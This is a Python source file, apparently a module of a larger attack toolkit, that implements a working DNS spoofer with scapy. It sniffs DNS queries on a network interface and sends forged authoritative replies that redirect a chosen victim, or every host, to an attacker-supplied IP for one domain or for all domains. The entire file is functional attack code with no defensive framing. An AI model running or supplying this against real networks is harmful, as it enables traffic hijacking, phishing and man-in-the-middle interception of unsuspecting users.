from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

def run_dns_spoofer(interface, target_ip, domain, redirect_ip):
    """
    DNS spoofing logic compatible with launcher.py.
    Parameters:
        interface (str): Network interface to use.
        target_ip (str): Target IP address to spoof (can be empty for all).
        domain (str): Domain to spoof (can be empty for all).
        redirect_ip (str): IP address to redirect to.
    """
    print(f"[*] DNS spoofer running on {interface}... CTRL+C to stop")
    print(f"[*] Target IP: {target_ip if target_ip else 'ALL'}")
    print(f"[*] Domain: {domain if domain else 'ALL'}")
    print(f"[*] Redirect IP: {redirect_ip}")

    def is_target_domain(query_name):
        if not domain or domain.strip() == "":
            # If no domain specified, spoof ALL domains
            return True
        # Match exact domain or subdomain
        return query_name == domain or query_name.endswith('.' + domain)

    def handle_dns_packet(packet):
        if packet.haslayer(DNS) and packet.haslayer(UDP):
            # DNS query
            if packet[DNS].qr == 0 and packet[DNS].opcode == 0:  # Standard query
                src_ip = packet[IP].src
                query_name = packet[DNSQR].qname.decode().rstrip('.')
                
                if (not target_ip or src_ip == target_ip) and is_target_domain(query_name):
                    print(f"[+] DNS request for {query_name} from {src_ip}")
                    
                    # Create spoofed DNS response
                    spoofed_pkt = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                        UDP(sport=53, dport=packet[UDP].sport) / \
                        DNS(
                            id=packet[DNS].id,
                            qr=1,    # response
                            aa=1,    # authoritative
                            rd=packet[DNS].rd,  # recursion desired (copy from request)
                            ra=1,    # recursion available
                            qd=packet[DNS].qd,  # question section
                            an=DNSRR(rrname=packet[DNSQR].qname, ttl=60, rdata=redirect_ip)
                        )
                    send(spoofed_pkt, verbose=0, iface=interface)
                    print(f"[+] Spoofed {query_name} → {redirect_ip} for {src_ip}")
                else:
                    if target_ip and src_ip != target_ip:
                        print(f"[-] Ignoring request from non-target IP: {src_ip}")
                    elif domain and domain.strip() != "" and not is_target_domain(query_name):
                        print(f"[-] Ignoring non-target domain: {query_name}")

    try:
        # Use a more specific filter to catch DNS queries
        sniff(filter="udp and port 53", iface=interface, prn=handle_dns_packet, store=0)
    except KeyboardInterrupt:
        print("\n[!] DNS spoofing stopped.")